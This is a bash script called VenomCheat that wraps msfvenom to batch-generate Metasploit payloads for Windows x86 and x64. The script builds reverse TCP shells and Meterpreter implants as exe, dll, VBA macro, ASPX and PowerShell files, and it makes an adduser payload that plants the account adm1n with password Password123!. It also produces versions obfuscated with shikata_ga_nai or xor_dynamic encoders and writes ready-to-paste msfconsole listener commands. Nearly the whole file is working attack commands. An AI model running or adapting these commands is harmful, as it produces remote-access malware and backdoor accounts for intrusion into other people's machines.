#!/bin/bash
#V1 is first release and Doesn't include sequential port numbering yet

#Vars
IP="" #-i
Port_Method="static" #-n
Port="" #-p
OS="all" #-o
VERS="1.0.0"
Arch="all" #a
Encoded="8" #e
Start="n" #s
Guided="n" #g

#border function
border()
{
    title="| $1 |"
    edge=$(echo "$title" | sed 's/./-/g')
    echo "$edge"
    echo "$title"
    echo "$edge"
}

#Help and Welcome
usage() {
  echo "██    ██ ███████ ███    ██  ██████  ███    ███      ██████ ██   ██ ███████  █████  ████████  "
  echo "██    ██ ██      ████   ██ ██    ██ ████  ████     ██      ██   ██ ██      ██   ██    ██    "
  echo "██    ██ █████   ██ ██  ██ ██    ██ ██ ████ ██     ██      ███████ █████   ███████    ██    "
  echo " ██  ██  ██      ██  ██ ██ ██    ██ ██  ██  ██     ██      ██   ██ ██      ██   ██    ██     "
  echo "  ████   ███████ ██   ████  ██████  ██      ██      ██████ ██   ██ ███████ ██   ██    ██      "
  echo ""
  border "About"
  echo "Version:        $VERS"
  echo "Created By:     marc@theirsecurity.com"
  echo "Github Release: http://github.com/theirsecurity/venomcheat"
  border "Usage"
  echo "VenomCheat uses msfvenom to create a multitude of different Metasploit payloads at once"
  echo "There are a few options you can set when you run this if you just want a specific OS"
  echo "This will place the generated payloads in the current directory, named so you know what they are"
  border "Guided Mode"
  echo "Dont want to have to know what options to use.... "
  echo "Launch guided mode with ./VenomCheat -g y"
  border "Options"
  echo "To use the defaults omit the operator from the command line"
  echo "-i  This sets the local host of your payloads                       Default:BLANK"
  echo "-p  This will set the local port for your payloads                  Default:BLANK"
  echo "-o  This allows you to specify one target OS                        Default:all"
  echo "-n  This allows you to set if port will be static or sequential     Default:Static"
  echo "-a  This allows you to specify x86,x64 or all                       Default:all"
  echo "-e  This allows you to choose encoding and iterations               Default:8"
  echo "-s  This sets whether or not the MSF command will autostart         Default:Yes"
  border "OS"
  echo "The following options are used with -o, If you want them all omit -o"
  echo "-o win    This will generate only windows payloads"
  echo "-o lin    This will generate only linux payloads"
  echo "-o mac    This will generate only mac payloads"
  echo "-o web    This will generate only web payloads"
  echo "-o raw    This will generate txt files with raw commands"
  border "Archetecture"
  echo "The following options are used to set the archetecture, if you want them all omit -a"
  echo "-a x86    This will only generate 32bit payloads"
  echo "-a x64    This will only generate 64bit payloads"
  border "Port Numbering"
  echo "The following options are used with -n"
  echo "-n static   All payloads are generated with the same listening port (This is default)"
  echo "-n seq      Payloads will be generated with different listening ports starting at the -p option"
  border "Encoding"
  echo "The following are used with -e. The number you set is the iterations it will use"
  echo "-e 0      This will skip generation of encoded payloads"
  echo "-e 8      This will generate encoded payloads with 8 iterations (It will use the number you set)"
  border "Venom Commands"
  echo "The following are used with -s"
  echo "-s y      This will add the auto start to the generated msf command in the output"
  echo "-s n      If you use the generated msf command, you will need to start this yourself"
  border "readme.md"
  echo "Once the script has run it will create a readme.md in the Venom Directory"
  echo "This will show the options used, everything it created, each files location and a command to start metasploit"
}
exit_abnormal() {
  usage
  exit 1
}



#Get opts
while getopts "i:g:o:p:a:n:e:s:h" options; do
  case "${options}" in
    g)
      Guided=${OPTARG}
      ;;
    i)
     IP=${OPTARG}
     ;;
    h)
    exit_abnormal
    ;;
    p)
    Port=${OPTARG}
    ;;
    o)
    OS=${OPTARG}
    ;;
    n)
    Port_Method=${OPTARG}
    ;;
    a)
    Arch=${OPTARG}
    ;;
    e)
    Encoded=${OPTARG}
    ;;
    s)
    Start=${OPTARG}
    ;;

  esac
done

#Error checking,Handling & Guided Mode

if [[ $Guided = "y" ]]
then
  echo "██    ██ ███████ ███    ██  ██████  ███    ███      ██████ ██   ██ ███████  █████  ████████  "
  echo "██    ██ ██      ████   ██ ██    ██ ████  ████     ██      ██   ██ ██      ██   ██    ██    "
  echo "██    ██ █████   ██ ██  ██ ██    ██ ██ ████ ██     ██      ███████ █████   ███████    ██    "
  echo " ██  ██  ██      ██  ██ ██ ██    ██ ██  ██  ██     ██      ██   ██ ██      ██   ██    ██     "
  echo "  ████   ███████ ██   ████  ██████  ██      ██      ██████ ██   ██ ███████ ██   ██    ██      "
  border "Guided Mode"
  read -p "Please your local IP Address (LocalHost): " IP
  read -p "Please enter the port you wish to use: " Port
  border "Operating System"
  echo "1) All OS"
  echo "2) Windows"
  echo "3) Linux"
  echo "4) Mac"
  echo "5) Web"
  echo "6) Raw"
  read -p "Please enter your option: " gos
  case $gos in
      [1]* ) echo "All OS selected" && OS="all";;
      [2]* ) echo "Windows selected" && OS="win";;
      [3]* ) echo "Linux selected" && OS="lin";;
      [4]* ) echo "Mac selected" && OS="mac";;
      [5]* ) echo "Web selected" && OS="web";;
      [6]* ) echo "Raw selected" && OS="raw";;
      * ) echo "Please answer 1,2,3,4,5,6";;
  esac
  border "Archetecture"
  echo "1) All"
  echo "2) x86"
  echo "3) x64"
  read -p "Please enter your option: " garch
  case $garch in
      [1]* ) echo "All Selected" && Arch="all";;
      [2]* ) echo "x86 Selected" && Arch="x86";;
      [3]* ) echo "x64 Selected" && Arch="x64";;
      * ) echo "Please answer 1,2,3";;
  esac
  border "Encoding"
  echo "0) No Encoded Payloads"
  echo "1+) This will generated encoded payloads and sets how many iterations"
  read -p "Please enter your option: " Encoded
  border "MSF Command"
  echo "1) The generated commands for MSF will automatically start the listener"
  echo "2) The generated command wont start the listener, useful if you need to alter something"
  read -p "Please enter your option: " gstart
  case $gstart in
    [1]* ) echo "Commands will automatically start listener" && Start="y";;
    [2]* ) echo "Commands will not automatically start listener" && Start="n";;
  esac
  border "Options Set"
  echo "Options have been set and payloads based on these are being generated now"
else
  echo "" > /dev/null
fi


if [[ $IP = "" ]] || [[ $Port = "" ]] #IP & Port Error check
then
  border "Error"
  echo "Please specify and IP and port"
  echo "To see syntax & Options use ./VenomCheat.sh -h"
  exit 1
else
  echo "" > /dev/null
fi

if [[ $OS = "all" ]] || [[ $OS = "win" ]] || [[ $OS = "lin" ]] || [[ $OS = "mac" ]] || [[ $OS = "web" ]] || [[ $OS = "raw" ]] #OS Error Check
then
  echo "" > /dev/null
else
  border "Error"
  echo "Invalid OS Selected"
  echo "To see syntax & Options use ./VenomCheat.sh -h"
  exit 1
fi

if [[ $Port_Method = "seq" ]] || [[ $Port_Method = "static" ]] #Port Method Error Check
then
  echo "" > /dev/null
else
  border "Error"
  echo "Invalid Port Numbering Option Selected"
  echo "To see syntax & Options use ./VenomCheat.sh -h"
  exit 1
fi

if [[ $Arch = "all" ]] || [[ $Arch = "x64" ]] || [[ $Arch = "x86" ]] #Arch Error Check
then
  echo "" > /dev/null
else
  border "Error"
  echo "Invalid Archetecture Selected"
  echo "To see syntax & Options use ./VenomCheat.sh -h"
  exit 1
fi

if [[ $Encoded > 0 ]] || [[ $Encoded < 1 ]] #Encoded error checking
then
  echo "" > /dev/null
else
  border "Error"
  echo "Invalid Encoding Selected"
  echo "To see syntax & Options use ./VenomCheat.sh -h"
  exit 1
fi

if [[ $Start = "y" ]] || [[ $Start = "n" ]]
then
  echo "" > /dev/null
else
  border "Error"
  echo "Invalid Start Method Selected"
  echo "To see syntax & Options use ./VenomCheat.sh -h"
  exit 1
fi

#Directory
if [ -d "./Venom" ]
then
  cd ./Venom
else
mkdir ./Venom && cd ./Venom
fi

#MSF Start Method & Additional Error Check
if [[ $Start = "y" ]]
then
  StartCom=";run'"
elif [[ $Start = "n" ]]
then
  StartCom="'"
else
  border "Error"
  echo "Invalid Start Method Selected"
  echo "To see syntax & Options use ./VenomCheat.sh -h"
  exit 1
fi


#Readme Initialisation
if [[ -w "./readme.md" ]]
then
  echo "" > /dev/null
else
  border "Settings Used" > readme.md
  echo "Local IP:     $IP" >> readme.md
  if [[ $Port_Method = "static" ]]
  then
    echo "Local Port:   $Port" >> readme.md
  else
    echo "Ports will be numbered incrementaly" >> readme.md
  fi
  echo "OS:           $OS" >> readme.md
  if [[ $Encoded > 0 ]]
  then
    echo "Encoding:     Yes" >> readme.md
    echo "Iterations:   $Encoded" >> readme.md
  else
    echo "Encoding:     No" >> readme.md
  fi
  echo "" >> readme.md
  border "Output and Commands" >> readme.md
  echo "This file contains a list of all generated payloads and Metasploit or Netcat commands" >> readme.md
  echo "The first line Shows the payload and its ouput directory" >> readme.md
  echo "The second line can be copied and pasted into a terminal which will start metasploit and set payload and options or start Netcat" >> readme.md
  echo "" >> readme.md
fi



if [[ $Port_Method = "seq" ]]
then
  echo "Sequential Selected"
else
  if [[ $OS = "all" ]] || [[ $OS = "win" ]]
  then
    if [[ -d "./Windows" ]]
    then
      echo "" > /dev/null
    else
    mkdir ./Windows
  fi
    if [[ $Arch = "all" ]] || [[ $Arch = "x86" ]]
    then
      if [[ -d "./Windows/x86" ]]
      then
        border "Windows x86 Exists"
        echo "Skipping payload generation for Windows x86"
      else
        border "Windows x86 Unencoded Payloads" >> readme.md
        mkdir ./Windows/x86
        msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f exe > ./Windows/x86/Meterpreter_Reverse_TCP_$Port.exe && echo "Meterpreter_Reverse_TCP (exe)   /Windows/x86/Meterpreter_Reverse_TCP_$Port.exe" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        msfvenom -a x86 --platform windows -p windows/adduser USER=adm1n PASS=Password123! -f exe > ./Windows/x86/adduser.exe && echo "Add_User (exe)     /Windows/x86/adduser.exe" >> readme.md && echo "Creates  User:adm1n Pass:Password123!" >> readme.md && echo "" >> readme.md
        msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$Port -f exe > ./Windows/x86/Shell_reverse_tcp_$Port.exe && echo "CMDShell_Reverse_TCP (exe)    /Windows/x86/Shell_reverse_tcp_$Port.exe" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$Port -f dll > ./Windows/x86/shell_reverse_tcp_$Port.dll && echo "shell_Reverse_TCP (dll)   /Windows/x86/shell_reverse_tcp_$Port.dll" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f dll > ./Windows/x86/meterpreter_reverse_tcp_$Port.dll && echo "meterpreter_Reverse_TCP (dll)   /Windows/x86/meterpreter_reverse_tcp_$Port.dll" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$Port -f vba > ./Windows/x86/shell_reverse_tcp_$Port.txt && echo "shell_Reverse_TCP (vba)   /Windows/x86/shell_reverse_tcp_$Port.vba" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f vba > ./Windows/x86/meterpreter_reverse_tcp_$Port.txt && echo "meterpreter_Reverse_TCP (vba)   /Windows/x86/meterpreter_reverse_tcp_$Port.txt" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$Port -f aspx > ./Windows/x86/shell_reverse_tcp_$Port.aspx && echo "shell_Reverse_TCP (aspx)   /Windows/x86/shell_reverse_tcp_$Port.aspx" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f aspx > ./Windows/x86/meterpreter_reverse_tcp_$Port.aspx && echo "meterpreter_Reverse_TCP (aspx)   /Windows/x86/meterpreter_reverse_tcp_$Port.aspx" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f psh > ./Windows/x86/meterpreter_reverse_tcp_$Port.ps1 && echo "meterpreter_Reverse_TCP (Powershell)   /Windows/x86/meterpreter_reverse_tcp_$Port.ps1" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$Port -f psh > ./Windows/x86/shell_reverse_tcp_$Port.ps1 && echo "shell_Reverse_TCP (Powershell)   /Windows/x86/shell_reverse_tcp_$Port.ps1" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        if [[ $Encoded > 0 ]]
        then
          border "Windows x86 Encoded Payloads" >> readme.md
          echo "These are encoded with Shikata ga nai using $Encoded iterations" >> readme.md && echo "" >> readme.md
          msfvenom -a x86 --platform windows -p windows/adduser USER=adm1n PASS=Password123! -e x86/shikata_ga_nai -b "\x00" -i $Encoded -f exe > ./Windows/x86/ENCadduser.exe && echo "Encoded Add_User (exe)     /Windows/X86/ENCadduser.exe" >> readme.md && echo "Creates  User:adm1n Pass:Password123!" >> readme.md && echo "" >> readme.md
          msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$Port -e x86/shikata_ga_nai -b "\x00" -i $Encoded -f exe > ./Windows/x86/ENCShell_reverse_tcp_$Port.exe && echo "Encoded CMDShell_Reverse_TCP (exe)    /Windows/X86/ENCShell_reverse_tcp_$Port.exe" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
          msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$Port -e x86/shikata_ga_nai -b "\x00" -i $Encoded -f dll > ./Windows/x86/ENCShell_reverse_tcp_$Port.dll && echo "Encoded CMDShell_Reverse_TCP (dll)    /Windows/X86/ENCShell_reverse_tcp_$Port.dll" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
          msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -e x86/shikata_ga_nai -b "\x00" -i $Encoded -f dll > ./Windows/x86/ENCMeterpreter_Reverse_TCP_$Port.dll && echo "Encoded_Meterpreter_Reverse_TCP (dll)   /Windows/x86/ENCMeterpreter_Reverse_TCP_$Port.dll" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
          msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$Port -e x86/shikata_ga_nai -b "\x00" -i $Encoded -f vba > ./Windows/x86/ENCShell_reverse_tcp_$Port.txt && echo "Encoded CMDShell_Reverse_TCP (vba)    /Windows/x86/ENCShell_reverse_tcp_$Port.txt" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
          msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -e x86/shikata_ga_nai -b "\x00" -i $Encoded -f vba > ./Windows/x86/ENCMeterpreter_Reverse_TCP_$Port.txt && echo "Encoded_Meterpreter_Reverse_TCP (vba)   /Windows/x86/ENCMeterpreter_Reverse_TCP_$Port.txt" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
          msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$Port -e x86/shikata_ga_nai -b "\x00" -i $Encoded -f aspx > ./Windows/x86/ENCShell_reverse_tcp_$Port.aspx && echo "Encoded CMDShell_Reverse_TCP (aspx)    /Windows/x86/ENCShell_reverse_tcp_$Port.aspx" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
          msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -e x86/shikata_ga_nai -b "\x00" -i $Encoded -f aspx > ./Windows/x86/ENCMeterpreter_Reverse_TCP_$Port.aspx && echo "Encoded_Meterpreter_Reverse_TCP (aspx)   /Windows/x86/ENCMeterpreter_Reverse_TCP_$Port.aspx" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
          msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$IP LPORT=$Port -e x86/shikata_ga_nai -b "\x00" -i $Encoded -f psh > ./Windows/x86/ENCShell_reverse_tcp_$Port.ps1 && echo "Encoded CMDShell_Reverse_TCP (Powershell)    /Windows/x86/ENCShell_reverse_tcp_$Port.ps1" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
          msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -e x86/shikata_ga_nai -b "\x00" -i $Encoded -f exe > ./Windows/x86/ENCMeterpreter_Reverse_TCP_$Port.exe && echo "Encoded_Meterpreter_Reverse_TCP (exe)   /Windows/X86/ENCMeterpreter_Reverse_TCP_$Port.exe" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
          msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -e x86/shikata_ga_nai -b "\x00" -i $Encoded -f psh > ./Windows/x86/ENCMeterpreter_Reverse_TCP_$Port.ps1 && echo "Encoded_Meterpreter_Reverse_TCP (Powershell)   /Windows/x86/ENCMeterpreter_Reverse_TCP_$Port.ps1" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        else
          echo "" > /dev/null
        fi
      fi
      else
        echo "" > /dev/null

    fi

    if [[ $Arch = "all" ]] || [[ $Arch = "x64" ]]
    then
      if [[ -d "./Windows/x64" ]]
      then
        border "Windows x64 Exists"
        echo "Skipping payload generation for Windows x64"
      else
        mkdir ./Windows/x64
        border "Windows x64 Unencoded Payloads" >> readme.md
        msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f exe > ./Windows/x64/Meterpreter_Reverse_TCP_$Port.exe && echo "Meterpreter_Reverse_TCP (exe)   /Windows/x64/Meterpreter_Reverse_TCP_$Port.exe" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=$Port -f exe > ./Windows/x64/Shell_reverse_tcp_$Port.exe && echo "CMDShell_Reverse_TCP (exe)    /Windows/x64/Shell_reverse_tcp_$Port.exe" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=$Port -f dll > ./Windows/x64/shell_reverse_tcp_$Port.dll && echo "shell_Reverse_TCP (dll)   /Windows/x64/shell_reverse_tcp_$Port.dll" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f dll > ./Windows/x64/meterpreter_reverse_tcp_$Port.dll && echo "meterpreter_Reverse_TCP (dll)   /Windows/x64/meterpreter_reverse_tcp_$Port.dll" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=$Port -f vba > ./Windows/x64/shell_reverse_tcp_$Port.txt && echo "shell_Reverse_TCP (vba)   /Windows/x64/shell_reverse_tcp_$Port.vba" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f vba > ./Windows/x64/meterpreter_reverse_tcp_$Port.txt && echo "meterpreter_Reverse_TCP (vba)   /Windows/x64/meterpreter_reverse_tcp_$Port.txt" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/x64/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=$Port -f aspx > ./Windows/x64/shell_reverse_tcp_$Port.aspx && echo "shell_Reverse_TCP (aspx)   /Windows/x64/shell_reverse_tcp_$Port.aspx" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f aspx > ./Windows/x64/meterpreter_reverse_tcp_$Port.aspx && echo "meterpreter_Reverse_TCP (aspx)   /Windows/x64/meterpreter_reverse_tcp_$Port.aspx" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=$Port -f psh > ./Windows/x64/shell_reverse_tcp_$Port.ps1 && echo "shell_Reverse_TCP (Powershell)   /Windows/x64/shell_reverse_tcp_$Port.ps1" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -f psh > ./Windows/x64/meterpreter_reverse_tcp_$Port.ps1 && echo "meterpreter_Reverse_TCP (Powershell)   /Windows/x64/meterpreter_reverse_tcp_$Port.ps1" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        if [[ $Encoded > 0 ]]
        then
          border "Windows x64 Encoded Payloads" >> readme.md
          echo "These are encoded with XOR Dynamic using $Encoded iterations" >> readme.md && echo "" >> readme.md
          msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -e x64/xor_dynamic -b "\x00" -i $Encoded -f exe > ./Windows/x64/ENCMeterpreter_Reverse_TCP_$Port.exe && echo "Encoded_Meterpreter_Reverse_TCP (exe)   /Windows/x64/ENCMeterpreter_Reverse_TCP_$Port.exe" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
          msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=$Port -e x64/xor_dynamic -b "\x00" -i $Encoded -f exe > ./Windows/x64/ENCShell_reverse_tcp_$Port.exe && echo "Encoded CMDShell_Reverse_TCP (exe)    /Windows/x64/ENCShell_reverse_tcp_$Port.exe" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
          msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=$Port -e x64/xor_dynamic  -b "\x00" -i $Encoded -f dll > ./Windows/x64/ENCShell_reverse_tcp_$Port.dll && echo "Encoded CMDShell_Reverse_TCP (dll)    /Windows/x64/ENCShell_reverse_tcp_$Port.dll" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
          msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -e x64/xor_dynamic  -b "\x00" -i $Encoded -f dll > ./Windows/x64/ENCMeterpreter_Reverse_TCP_$Port.dll && echo "Encoded_Meterpreter_Reverse_TCP (dll)   /Windows/x64/ENCMeterpreter_Reverse_TCP_$Port.dll" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
          msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=$Port -e x64/xor_dynamic  -b "\x00" -i $Encoded -f vba > ./Windows/x64/ENCShell_reverse_tcp_$Port.txt && echo "Encoded CMDShell_Reverse_TCP (vba)    /Windows/x64/ENCShell_reverse_tcp_$Port.txt" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
          msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -e x64/xor_dynamic -b "\x00" -i $Encoded -f vba > ./Windows/x64/ENCMeterpreter_Reverse_TCP_$Port.txt && echo "Encoded_Meterpreter_Reverse_TCP (vba)   /Windows/x64/ENCMeterpreter_Reverse_TCP_$Port.txt" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
          msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=$Port -e x64/xor_dynamic -b "\x00" -i $Encoded -f aspx > ./Windows/x64/ENCShell_reverse_tcp_$Port.aspx && echo "Encoded CMDShell_Reverse_TCP (aspx)    /Windows/x64/ENCShell_reverse_tcp_$Port.aspx" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
          msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -e x64/xor_dynamic -b "\x00" -i $Encoded -f aspx > ./Windows/x64/ENCMeterpreter_Reverse_TCP_$Port.aspx && echo "Encoded_Meterpreter_Reverse_TCP (aspx)   /Windows/x64/ENCMeterpreter_Reverse_TCP_$Port.aspx" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
          msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$IP LPORT=$Port -e x64/xor_dynamic -b "\x00" -i $Encoded -f psh > ./Windows/x64/ENCShell_reverse_tcp_$Port.ps1 && echo "Encoded CMDShell_Reverse_TCP (Powershell)    /Windows/x64/ENCShell_reverse_tcp_$Port.ps1" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/shell/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
          msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$Port -e x64/xor_dynamic -b "\x00" -i $Encoded -f psh > ./Windows/x64/ENCMeterpreter_Reverse_TCP_$Port.ps1 && echo "Encoded_Meterpreter_Reverse_TCP (Powershell)   /Windows/x64/ENCMeterpreter_Reverse_TCP_$Port.ps1" >> readme.md && echo "msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost $IP;set lport $Port$StartCom" >> readme.md && echo "" >> readme.md
        else
          echo "" > /dev/null
        fi
      fi
    else
      echo "" > /dev/null
    fi
  else
    echo "" > /dev/null
  fi

